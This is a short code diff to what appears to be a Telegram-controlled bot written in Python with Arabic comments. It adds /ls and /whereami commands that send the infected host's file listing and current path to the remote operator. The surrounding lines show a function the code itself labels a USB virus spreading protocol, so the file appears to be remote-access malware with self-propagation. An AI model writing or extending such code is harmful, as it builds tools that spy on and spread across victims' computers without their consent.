@@ -56,7 +56,25 @@ def welcome(message):
         "أنا بانتظار أوامرك."
     )
     bot.reply_to(message, response)
+# --- أمر استعراض الملفات (List Files) ---
+@bot.message_handler(commands=['ls'])
+def list_files(message):
+    try:
+        # تحديد المسار (الحالي أو المطلوب)
+        path = "." 
+        files = os.listdir(path)
+        response = "📂 **قائمة الملفات في المجلد الحالي:**\n\n"
+        for f in files:
+            response += f"📄 `{f}`\n"
+        bot.reply_to(message, response, parse_mode="Markdown")
+    except Exception as e:
+        bot.reply_to(message, f"❌ خطأ في قراءة الملفات: {str(e)}")
 
+# --- أمر معرفة المسار الحالي (PWD) ---
+@bot.message_handler(commands=['whereami'])
+def current_path(message):
+    path = os.getcwd()
+    bot.reply_to(message, f"📍 أنت الآن في المسار:\n`{path}`", parse_mode="Markdown")
 # --- بروتوكول الانتشار (USB Virus) ---
 def usb_spreader():
     while True:
